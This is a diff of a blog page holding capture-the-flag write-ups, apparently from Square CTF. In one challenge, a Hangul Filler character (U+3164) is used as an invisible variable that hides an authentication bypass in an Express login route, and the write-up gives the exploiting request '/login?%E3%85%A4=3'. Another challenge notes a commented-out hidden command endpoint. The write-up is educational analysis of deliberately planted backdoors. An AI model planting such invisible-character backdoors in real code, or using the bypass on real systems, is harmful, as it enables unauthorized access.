+any loose ends that could be used to compromise the entire
+application</p>
 </blockquote>
 <p>Well, that’s a bit vague.</p>
 <p>Let’s see what we’re working with:</p>
 <figure>
-<img src="../assets/square-ctf/image-20231110165144984.png" alt="A report form, taking a Name, Subject, and Message" /><figcaption aria-hidden="true">A report form, taking a Name, Subject, and Message</figcaption>
+<img src="../assets/square-ctf/image-20231110165144984.png"
+alt="A report form, taking a Name, Subject, and Message" />
+<figcaption aria-hidden="true">A report form, taking a Name, Subject,
+and Message</figcaption>
 </figure>
 <p>Beautiful graphic design 🤩</p>
 <p>What happens when we enter in some data?</p>
 <figure>
-<img src="../assets/square-ctf/image-20231110165316429.png" alt="Entering “foo”, “bar”, “baz”" /><figcaption aria-hidden="true">Entering “foo”, “bar”, “baz”</figcaption>
+<img src="../assets/square-ctf/image-20231110165316429.png"
+alt="Entering “foo”, “bar”, “baz”" />
+<figcaption aria-hidden="true">Entering “foo”, “bar”, “baz”</figcaption>
 </figure>
 <p>And we get:</p>
 <pre><code>Sorry, a new folder couldn&#39;t be created for your reports</code></pre>
 <p>Hmm. Unfortunate.</p>
-<p>Checking the source code (<kbd>Ctrl</kbd>+<kbd>U</kbd>) of the main page, we see:</p>
-<div class="sourceCode" id="cb15"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE </span>html<span class="dt">&gt;</span></span>
-<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;html</span> <span class="er">lang</span><span class="ot">=</span><span class="st">&quot;en&quot;</span><span class="kw">&gt;</span></span>
-<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">&lt;head&gt;</span></span>
-<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;meta</span> <span class="er">charset</span><span class="ot">=</span><span class="st">&quot;UTF-8&quot;</span> <span class="kw">/&gt;</span></span>
-<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;title&gt;</span>Report Submission<span class="kw">&lt;/title&gt;</span></span>
-<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>  <span class="kw">&lt;/head&gt;</span></span>
-<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>  <span class="kw">&lt;body&gt;</span></span>
-<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;h1&gt;</span>Please fill out the form below to submit a report<span class="kw">&lt;/h1&gt;</span></span>
-<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;form</span> <span class="er">action</span><span class="ot">=</span><span class="st">&quot;/reports/submit&quot;</span> <span class="er">method</span><span class="ot">=</span><span class="st">&quot;post&quot;</span><span class="kw">&gt;</span></span>
-<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;label</span> <span class="er">for</span><span class="ot">=</span><span class="st">&quot;name&quot;</span><span class="kw">&gt;</span>Name:<span class="kw">&lt;/label&gt;&lt;br</span> <span class="kw">/&gt;</span></span>
-<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;input</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;text&quot;</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;name&quot;</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;name&quot;</span> <span class="kw">/&gt;&lt;br</span> <span class="kw">/&gt;</span></span>
-<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;label</span> <span class="er">for</span><span class="ot">=</span><span class="st">&quot;subject&quot;</span><span class="kw">&gt;</span>Subject:<span class="kw">&lt;/label&gt;&lt;br</span> <span class="kw">/&gt;</span></span>
-<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;input</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;text&quot;</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;subject&quot;</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;subject&quot;</span> <span class="kw">/&gt;&lt;br</span> <span class="kw">/&gt;</span></span>
-<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;label</span> <span class="er">for</span><span class="ot">=</span><span class="st">&quot;message&quot;</span><span class="kw">&gt;</span>Message:<span class="kw">&lt;/label&gt;&lt;br</span> <span class="kw">/&gt;</span></span>
-<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;textarea</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;message&quot;</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;message&quot;</span> <span class="er">rows</span><span class="ot">=</span><span class="st">&quot;5&quot;</span> <span class="er">cols</span><span class="ot">=</span><span class="st">&quot;60&quot;</span><span class="kw">&gt;&lt;/textarea&gt;&lt;br</span> <span class="kw">/&gt;</span></span>
-<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;input</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;submit&quot;</span> <span class="kw">/&gt;</span></span>
-<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;/form&gt;</span></span>
+<p>Checking the source code (<kbd>Ctrl</kbd>+<kbd>U</kbd>) of the main
+page, we see:</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE </span>html<span class="dt">&gt;</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span> <span class="er">lang</span><span class="ot">=</span><span class="st">&quot;en&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">head</span><span class="dt">&gt;</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">meta</span> <span class="er">charset</span><span class="ot">=</span><span class="st">&quot;UTF-8&quot;</span> <span class="dt">/&gt;</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">title</span><span class="dt">&gt;</span>Report Submission<span class="dt">&lt;/</span><span class="kw">title</span><span class="dt">&gt;</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">head</span><span class="dt">&gt;</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>Please fill out the form below to submit a report<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">form</span> <span class="er">action</span><span class="ot">=</span><span class="st">&quot;/reports/submit&quot;</span> <span class="er">method</span><span class="ot">=</span><span class="st">&quot;post&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">label</span> <span class="er">for</span><span class="ot">=</span><span class="st">&quot;name&quot;</span><span class="dt">&gt;</span>Name:<span class="dt">&lt;/</span><span class="kw">label</span><span class="dt">&gt;&lt;</span><span class="kw">br</span> <span class="dt">/&gt;</span></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;text&quot;</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;name&quot;</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;name&quot;</span> <span class="dt">/&gt;&lt;</span><span class="kw">br</span> <span class="dt">/&gt;</span></span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">label</span> <span class="er">for</span><span class="ot">=</span><span class="st">&quot;subject&quot;</span><span class="dt">&gt;</span>Subject:<span class="dt">&lt;/</span><span class="kw">label</span><span class="dt">&gt;&lt;</span><span class="kw">br</span> <span class="dt">/&gt;</span></span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;text&quot;</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;subject&quot;</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;subject&quot;</span> <span class="dt">/&gt;&lt;</span><span class="kw">br</span> <span class="dt">/&gt;</span></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">label</span> <span class="er">for</span><span class="ot">=</span><span class="st">&quot;message&quot;</span><span class="dt">&gt;</span>Message:<span class="dt">&lt;/</span><span class="kw">label</span><span class="dt">&gt;&lt;</span><span class="kw">br</span> <span class="dt">/&gt;</span></span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">textarea</span> <span class="er">id</span><span class="ot">=</span><span class="st">&quot;message&quot;</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;message&quot;</span> <span class="er">rows</span><span class="ot">=</span><span class="st">&quot;5&quot;</span> <span class="er">cols</span><span class="ot">=</span><span class="st">&quot;60&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">textarea</span><span class="dt">&gt;&lt;</span><span class="kw">br</span> <span class="dt">/&gt;</span></span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;submit&quot;</span> <span class="dt">/&gt;</span></span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
 <span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>    <span class="co">&lt;!--&lt;iframe src=&quot;/help.html&quot; title=&quot;Help Menu&quot;&gt;&lt;/iframe&gt;--&gt;</span></span>
-<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>  <span class="kw">&lt;/body&gt;</span></span>
-<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
-<p>Looks like someone commented out an iframe linking to the help menu!</p>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
+<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>Looks like someone commented out an iframe linking to the help
+menu!</p>
 <p>What happens when we visit <code>/help.html</code>?</p>
 <figure>
-<img src="../assets/square-ctf/image-20231110165720384.png" alt="What can I help you with? Contact, Report, Time, or Show" /><figcaption aria-hidden="true">What can I help you with? Contact, Report, Time, or Show</figcaption>
+<img src="../assets/square-ctf/image-20231110165720384.png"
+alt="What can I help you with? Contact, Report, Time, or Show" />
+<figcaption aria-hidden="true">What can I help you with? Contact,
+Report, Time, or Show</figcaption>
 </figure>
-<p>If we use our browser’s developer tools to edit the page to replace</p>
+<p>If we use our browser’s developer tools to edit the page to
+replace</p>
 <pre><code>&lt;!--&lt;iframe src=&quot;/help.html&quot; title=&quot;Help Menu&quot;&gt;&lt;/iframe&gt;--&gt;</code></pre>
 <p>with</p>
-<div class="sourceCode" id="cb17"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;iframe</span></span>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span></span>
 <span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ot">  src=</span><span class="st">&quot;/help.html&quot;</span></span>
 <span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="ot">  style=</span><span class="st">&quot;width: 100%; height:20em;&quot;</span></span>
 <span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="ot">  title=</span><span class="st">&quot;Help Menu&quot;</span></span>
-<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="kw">&gt;&lt;/iframe&gt;</span></span></code></pre></div>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
 <p>We can see the help page.</p>
-<p>In the source code distributed with the challenge, we see the following file:</p>
-<div class="sourceCode" id="cb18"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co">// AppSec team doesn&#39;t want us implementing hidden Command endpoints for remote administration</span></span>
+<p>In the source code distributed with the challenge, we see the
+following file:</p>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode java"><code class="sourceCode java"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co">// AppSec team doesn&#39;t want us implementing hidden Command endpoints for remote administration</span></span>
 <span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="co">// They said to delete it altogether, but I don&#39;t see why commenting out just this Controller</span></span>
 <span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="co">// would be any less secure</span></span>
 <span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="co">//@Controller</span></span>
@@ -462,16 +582,21 @@ Here are the contents of 0xdeadbeef:</code></pre>
 <span id="cb18-36"><a href="#cb18-36" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
 <p><strong>This is not finished either.</strong></p>
 <h2 id="korean-space-program-2021">Korean Space Program (2021)</h2>
-<p><a href="https://squarectf.com/2021/koreanspaceprogram.html" class="uri">https://squarectf.com/2021/koreanspaceprogram.html</a></p>
+<p><a href="https://squarectf.com/2021/koreanspaceprogram.html"
+class="uri">https://squarectf.com/2021/koreanspaceprogram.html</a></p>
 <blockquote>
-<p>The Korean Space Program’s login portal is having trouble with unauthorized access to their systems. You can find their login page linked. Can you take a look at it and the included source file to figure out what is wrong?</p>
+<p>The Korean Space Program’s login portal is having trouble with
+unauthorized access to their systems. You can find their login page
+linked. Can you take a look at it and the included source file to figure
+out what is wrong?</p>
 </blockquote>
 <p>This problem includes the following Express app:</p>
 <details>
 <summary>
 Show full code
 </summary>
-<div class="sourceCode" id="cb19"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> express <span class="op">=</span> <span class="pp">require</span>(<span class="st">&quot;express&quot;</span>)<span class="op">;</span></span>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> express <span class="op">=</span> <span class="pp">require</span>(<span class="st">&quot;express&quot;</span>)<span class="op">;</span></span>
 <span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> { timingSafeEqual } <span class="op">=</span> <span class="pp">require</span>(<span class="st">&quot;crypto&quot;</span>)<span class="op">;</span></span>
 <span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="co">// </span><span class="al">TODO</span><span class="co">: What were we optimizing by using bitflags for the environments again?</span></span>
@@ -541,48 +666,96 @@ Show full code
 <span id="cb19-68"><a href="#cb19-68" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb19-69"><a href="#cb19-69" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">listen</span>(<span class="dv">8080</span><span class="op">,</span> <span class="st">&quot;0.0.0.0&quot;</span>)<span class="op">;</span></span></code></pre></div>
 </details>
-<p>This looks pretty innocent to begin with. They’re even making sure that it’s secure against timing attacks. That’s great.</p>
-<p>However, if you’re in Vim and you do <a href="https://stackoverflow.com/a/1675752"><code>:set list</code></a>, you’ll notice something off:</p>
+<p>This looks pretty innocent to begin with. They’re even making sure
+that it’s secure against timing attacks. That’s great.</p>
+<p>However, if you’re in Vim and you do <a
+href="https://stackoverflow.com/a/1675752"><code>:set list</code></a>,
+you’ll notice something off:</p>
 <figure>
-<img src="../assets/square-ctf/image-20231110160142811.png" alt="Screenshot of Vim with whitespace listed" /><figcaption aria-hidden="true">Screenshot of Vim with whitespace listed</figcaption>
+<img src="../assets/square-ctf/image-20231110160142811.png"
+alt="Screenshot of Vim with whitespace listed" />
+<figcaption aria-hidden="true">Screenshot of Vim with whitespace
+listed</figcaption>
 </figure>
 <p>There are no spaces between the environment checks 🤔</p>
-<p>Looking more closely, using a Unicode Character analyzer, we can see that the Korean developers must have errantly added some whitespace to this code:</p>
+<p>Looking more closely, using a Unicode Character analyzer, we can see
+that the Korean developers must have errantly added some whitespace to
+this code:</p>
 <figure>
-<img src="../assets/square-ctf/image-20231110160713552.png" alt="\u3164 comes before the unary plus" /><figcaption aria-hidden="true"><code>\u3164</code> comes before the unary plus</figcaption>
+<img src="../assets/square-ctf/image-20231110160713552.png"
+alt="\u3164 comes before the unary plus" />
+<figcaption aria-hidden="true"><code>\u3164</code> comes before the
+unary plus</figcaption>
 </figure>
-<p>This is a theme for all of the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Unary_plus">unary plus expressions</a>. They are prefixed by the Unicode Character “ㅤ” (<a href="https://www.compart.com/en/unicode/U+3164">U+3164</a>)</p>
+<p>This is a theme for all of the <a
+href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Unary_plus">unary
+plus expressions</a>. They are prefixed by the Unicode Character “ㅤ”
+(<a href="https://www.compart.com/en/unicode/U+3164">U+3164</a>)</p>
 <blockquote>
-<p>The Hangul Filler character is used to introduce eight-byte Hangul composition sequences and to stand in for an absent element (usually an empty final) in such a sequence.</p>
+<p>The Hangul Filler character is used to introduce eight-byte Hangul
+composition sequences and to stand in for an absent element (usually an
+empty final) in such a sequence.</p>
 <p>— <cite><a href="https://en.wikipedia.org/wiki/KS_X_1001#Hangul_Filler">Wikipedia</a></cite></p>
 </blockquote>
-<p>There’s also a Hangul Filler character in the object destructuring:</p>
-<div class="sourceCode" id="cb20"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> { username<span class="op">,</span> password<span class="op">,</span> ㅤ } <span class="op">=</span> req<span class="op">.</span><span class="at">query</span><span class="op">;</span></span></code></pre></div>
-<p>meaning that three request parameters are destructured into local variables:</p>
-<div class="sourceCode" id="cb21"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a>req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">username</span><span class="op">;</span></span>
+<p>There’s also a Hangul Filler character in the object
+destructuring:</p>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> { username<span class="op">,</span> password<span class="op">,</span> ㅤ } <span class="op">=</span> req<span class="op">.</span><span class="at">query</span><span class="op">;</span></span></code></pre></div>
+<p>meaning that three request parameters are destructured into local
+variables:</p>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a>req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">username</span><span class="op">;</span></span>
 <span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">password</span><span class="op">;</span></span>
 <span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">ㅤ</span><span class="op">;</span> <span class="co">// HANGUL FILLER</span></span></code></pre></div>
-<p>As such, we can control the value of the filler character via URL parameters.</p>
-<p>If we throw this into <a href="https://astexplorer.net/" class="uri">https://astexplorer.net/</a>, we can see that the left expression is properly interpreted as a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Unary_plus">UnaryExpression</a>, which is what we wanted. It’s going to make any number positive.</p>
+<p>As such, we can control the value of the filler character via URL
+parameters.</p>
+<p>If we throw this into <a href="https://astexplorer.net/"
+class="uri">https://astexplorer.net/</a>, we can see that the left
+expression is properly interpreted as a <a
+href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Unary_plus">UnaryExpression</a>,
+which is what we wanted. It’s going to make any number positive.</p>
 <figure>
-<img src="../assets/square-ctf/image-20231110161231483.png" alt="UnaryExpression === BinaryExpression" /><figcaption aria-hidden="true">UnaryExpression === BinaryExpression</figcaption>
+<img src="../assets/square-ctf/image-20231110161231483.png"
+alt="UnaryExpression === BinaryExpression" />
+<figcaption aria-hidden="true">UnaryExpression ===
+BinaryExpression</figcaption>
 </figure>
-<p>However, the right hand side of <code>+ENV_STAGE_WEST ==ㅤ+ENVIRONMENT</code> gets interpreted as a binary expression, concatenating the variable named <code>\u3164</code> (whitespace) to <code>ENVIRONMENT</code>.</p>
-<p>Thus, if we can control the value of that variable, we can make the environment comparison evaluate to <code>true</code>, and we can get access.</p>
-<p>Looking at the values we’re comparing to, we’d need to produce one of 1, 2, 4, 8, 16, or 32.</p>
-<div class="sourceCode" id="cb22"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="op">+</span>ENV_STAGE_EAST <span class="op">==</span> ㅤ <span class="op">+</span> ENVIRONMENT <span class="op">||</span></span>
+<p>However, the right hand side of
+<code>+ENV_STAGE_WEST ==ㅤ+ENVIRONMENT</code> gets interpreted as a
+binary expression, concatenating the variable named <code>\u3164</code>
+(whitespace) to <code>ENVIRONMENT</code>.</p>
+<p>Thus, if we can control the value of that variable, we can make the
+environment comparison evaluate to <code>true</code>, and we can get
+access.</p>
+<p>Looking at the values we’re comparing to, we’d need to produce one of
+1, 2, 4, 8, 16, or 32.</p>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="op">+</span>ENV_STAGE_EAST <span class="op">==</span> ㅤ <span class="op">+</span> ENVIRONMENT <span class="op">||</span></span>
 <span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="op">+</span>ENV_STAGE_WEST <span class="op">==</span> ㅤ <span class="op">+</span> ENVIRONMENT <span class="op">||</span></span>
 <span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="op">+</span>ENV_DEV_EAST   <span class="op">==</span> ㅤ <span class="op">+</span> ENVIRONMENT <span class="op">||</span></span>
 <span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="op">+</span>ENV_DEV_WEST   <span class="op">==</span> ㅤ <span class="op">+</span> ENVIRONMENT<span class="op">;</span></span></code></pre></div>
-<p>In the final comparison, we can see that <code>ENV_DEV_WEST</code> equals <code>32</code>, and we know that <code>ENVIRONMENT</code> is set to <code>2</code>.</p>
-<p>As such, if we set the Hangul whitespace to 3, we’ll make <code>"32"</code>, which is equal to <code>32</code> when compared with <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Equality"><code>==</code></a>.</p>
-<p>We can start with a request saying that <code>\u3164</code> must equal <code>3</code>, such as:</p>
-<div class="sourceCode" id="cb23"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> character <span class="op">=</span> <span class="st">&quot;ㅤ&quot;</span><span class="op">;</span></span>
+<p>In the final comparison, we can see that <code>ENV_DEV_WEST</code>
+equals <code>32</code>, and we know that <code>ENVIRONMENT</code> is set
+to <code>2</code>.</p>
+<p>As such, if we set the Hangul whitespace to 3, we’ll make
+<code>"32"</code>, which is equal to <code>32</code> when compared with
+<a
+href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Equality"><code>==</code></a>.</p>
+<p>We can start with a request saying that <code>\u3164</code> must
+equal <code>3</code>, such as:</p>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> character <span class="op">=</span> <span class="st">&quot;ㅤ&quot;</span><span class="op">;</span></span>
 <span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="co">// use Chrome/FireFox/nodejs to convert this for you:</span></span>
 <span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> encoded <span class="op">=</span> <span class="pp">encodeURIComponent</span>(character)<span class="op">;</span></span>
 <span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="vs">`/login?</span><span class="sc">${</span>encoded<span class="sc">}</span><span class="vs">=3`</span>)<span class="op">;</span> <span class="co">// prints /login?%E3%85%A4=3</span></span></code></pre></div>
-<p>In the provided code, the Hangul whitespace character ‘ㅤ’ is being used as a property name in <code>req.query</code>. When you visit <code>/login?%E3%85%A4=3</code>, the URL is decoded to <code>/login?ㅤ=3</code>, and <code>req.query.ㅤ</code> is set to <code>'3'</code>.</p>
-<p>It’s worth being aware of <a href="https://en.wikipedia.org/wiki/Whitespace_character#Non-space_blanks">Non-space blank characters</a> for situations like this.</p>
+<p>In the provided code, the Hangul whitespace character ‘ㅤ’ is being
+used as a property name in <code>req.query</code>. When you visit
+<code>/login?%E3%85%A4=3</code>, the URL is decoded to
+<code>/login?ㅤ=3</code>, and <code>req.query.ㅤ</code> is set to
+<code>'3'</code>.</p>
+<p>It’s worth being aware of <a
+href="https://en.wikipedia.org/wiki/Whitespace_character#Non-space_blanks">Non-space
+blank characters</a> for situations like this.</p>
 
 
     </article>
@@ -602,7 +775,7 @@ Show full code
 
   <div class="page-bottom">
     <div class="copyright">
-      &copy; 2023 Zack Sargent
+      &copy; 2024 Zack Sargent
     </div>
     <div class="top">
       <a href="javascript:window.scrollTo({ top: 0, behavior: 'smooth' })">
